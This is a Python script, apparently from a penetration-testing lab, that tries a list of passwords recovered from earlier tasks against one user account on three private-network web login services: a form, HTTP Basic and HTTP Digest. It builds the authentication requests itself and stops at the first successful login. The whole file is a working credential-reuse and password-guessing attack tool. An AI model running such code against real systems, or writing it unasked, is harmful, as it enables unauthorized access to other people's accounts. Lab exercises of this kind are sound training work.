#!/usr/bin/env python3
"""
Credential Reuse Testing Script
Tests all discovered passwords from PVD/RSA tasks across web services
"""

import requests
import base64
import hashlib
import time
from urllib.parse import quote

class WebAuthTester:
    def __init__(self):
        self.html_url = 'http://192.168.100.101/dologin.html'
        self.basic_url = 'http://192.168.100.103/basicauth'
        self.digest_url = 'http://192.168.100.103/digestauth'
        self.username = 'wangxx'
        
        # All discovered passwords from PVD/RSA tasks
        self.discovered_passwords = [
            # Windows 7 passwords
            'a1b2c3d4', 'qwerty10', 'letmein2', 'passw0rd', 
            'qaZwsX', '1q2w3e4r', 'trustno1',
            
            # Windows 2003 passwords
            'mskitty666', 'D5912K8', 'ABB1T',
            
            # Linux passwords (capitalized versions)
            'A1B2C3D4', 'Qwerty10', 'LetMeIn2', 'Passw0rd',
            'QazWsx', '1Q2w3e4R', 'trustNo1',
            
            # RSA passphrase
            '111111',
            
            # Common 8-character variations for HTML form
            'a1b2c3d4', 'qwerty10', 'letmein2', 'passw0rd',
            'qazwsx12', '1q2w3e4r', 'trustno1', '11111111',
            
            # Keyboard patterns related to qaZwsX
            'qwertyui', 'asdfghjk', 'zxcvbnm1',
            'qazwsx12', 'wsxedc12', 'edcvfr12',
            
            # Common transformations
            'password', 'Password', 'PASSWORD',
            'admin123', 'test1234', 'qwerty12'
        ]
    
    def test_html_form(self, password):
        """Test HTML form authentication"""
        try:
            response = requests.post(
                self.html_url,
                data={'httpd_username': self.username, 'httpd_password': password},
                timeout=10,
                allow_redirects=False
            )
            
            # Check for success indicators
            if response.status_code == 302:  # Redirect typically means success
                location = response.headers.get('Location', '')
                if 'success' in location.lower() or 'welcome' in location.lower():
                    return True, f"SUCCESS: Redirect to {location}"
            
            if response.status_code == 200:
                content = response.text.lower()
                if 'welcome' in content or 'success' in content or 'authenticated' in content:
                    return True, f"SUCCESS: Content indicates success"
                if 'invalid' in content or 'incorrect' in content or 'failed' in content:
                    return False, f"FAILED: Invalid credentials message"
            
            return False, f"Status: {response.status_code}"
            
        except Exception as e:
            return False, f"ERROR: {str(e)}"
    
    def test_basic_auth(self, password):
        """Test HTTP Basic authentication"""
        try:
            auth_header = base64.b64encode(f"{self.username}:{password}".encode()).decode()
            
            response = requests.get(
                self.basic_url,
                headers={'Authorization': f'Basic {auth_header}'},
                timeout=10
            )
            
            if response.status_code == 200:
                return True, f"SUCCESS: Status 200, Content length: {len(response.text)}"
            elif response.status_code == 401:
                return False, f"FAILED: 401 Unauthorized"
            else:
                return False, f"Status: {response.status_code}"
                
        except Exception as e:
            return False, f"ERROR: {str(e)}"
    
    def get_digest_challenge(self):
        """Get digest authentication challenge"""
        try:
            response = requests.get(self.digest_url, timeout=10)
            if response.status_code == 401:
                auth_header = response.headers.get('WWW-Authenticate', '')
                if 'Digest' in auth_header:
                    return auth_header
            return None
        except:
            return None
    
    def test_digest_auth(self, password):
        """Test HTTP Digest authentication"""
        try:
            # Get fresh challenge
            challenge = self.get_digest_challenge()
            if not challenge:
                return False, "ERROR: Could not get digest challenge"
            
            # Parse challenge (simplified)
            import re
            
            realm_match = re.search(r'realm="([^"]*)"', challenge)
            nonce_match = re.search(r'nonce="([^"]*)"', challenge)
            
            if not realm_match or not nonce_match:
                return False, "ERROR: Could not parse digest challenge"
            
            realm = realm_match.group(1)
            nonce = nonce_match.group(1)
            
            # Create digest response
            ha1 = hashlib.md5(f"{self.username}:{realm}:{password}".encode()).hexdigest()
            ha2 = hashlib.md5(f"GET:/digestauth".encode()).hexdigest()
            response_hash = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
            
            auth_header = (f'Digest username="{self.username}", realm="{realm}", '
                          f'nonce="{nonce}", uri="/digestauth", '
                          f'response="{response_hash}"')
            
            response = requests.get(
                self.digest_url,
                headers={'Authorization': auth_header},
                timeout=10
            )
            
            if response.status_code == 200:
                return True, f"SUCCESS: Status 200, Content length: {len(response.text)}"
            elif response.status_code == 401:
                return False, f"FAILED: 401 Unauthorized"
            else:
                return False, f"Status: {response.status_code}"
                
        except Exception as e:
            return False, f"ERROR: {str(e)}"
    
    def run_all_tests(self):
        """Run all credential reuse tests"""
        results = {
            'html': [],
            'basic': [],
            'digest': []
        }
        
        print("Credential Reuse Testing")
        print("=" * 50)
        print(f"Testing {len(self.discovered_passwords)} discovered passwords...")
        print()
        
        for i, password in enumerate(self.discovered_passwords, 1):
            print(f"[{i:2d}/{len(self.discovered_passwords)}] Testing password: '{password}'")
            
            # Test HTML form
            success, msg = self.test_html_form(password)
            results['html'].append((password, success, msg))
            print(f"  HTML Form:  {msg}")
            
            if success:
                print(f"*** HTML FORM SUCCESS WITH PASSWORD: {password} ***")
                return results  # Stop on first success
            
            time.sleep(0.2)  # Rate limiting
            
            # Test Basic auth
            success, msg = self.test_basic_auth(password)
            results['basic'].append((password, success, msg))
            print(f"  Basic Auth: {msg}")
            
            if success:
                print(f"*** BASIC AUTH SUCCESS WITH PASSWORD: {password} ***")
                return results  # Stop on first success
            
            time.sleep(0.2)  # Rate limiting
            
            # Test Digest auth (only for 6-character passwords)
            if len(password) == 6 and password.replace('_', '').replace('-', '').isalnum():
                success, msg = self.test_digest_auth(password)
                results['digest'].append((password, success, msg))
                print(f"  Digest Auth: {msg}")
                
                if success:
                    print(f"*** DIGEST AUTH SUCCESS WITH PASSWORD: {password} ***")
                    return results  # Stop on first success
            else:
                results['digest'].append((password, False, "SKIPPED: Not 6-char alphanumeric"))
                print(f"  Digest Auth: SKIPPED (wrong format)")
            
            print()
            time.sleep(0.5)  # Rate limiting between passwords
        
        print("=" * 50)
        print("CREDENTIAL REUSE TEST COMPLETE - NO SUCCESSES FOUND")
        print("=" * 50)
        
        return results

if __name__ == "__main__":
    tester = WebAuthTester()
    results = tester.run_all_tests()
    
    # Print summary
    print("\nSUMMARY:")
    html_attempts = len([r for r in results['html'] if r[0]])
    basic_attempts = len([r for r in results['basic'] if r[0]])  
    digest_attempts = len([r for r in results['digest'] if r[0]])
    
    print(f"HTML Form attempts: {html_attempts}")
    print(f"Basic Auth attempts: {basic_attempts}")
    print(f"Digest Auth attempts: {digest_attempts}")
    
    successes = []
    for service, test_results in results.items():
        for password, success, msg in test_results:
            if success:
                successes.append((service, password, msg))
    
    if successes:
        print("\nSUCCESSFUL AUTHENTICATIONS:")
        for service, password, msg in successes:
            print(f"{service.upper()}: {password} - {msg}")
    else:
        print("\nNo successful authentications found.")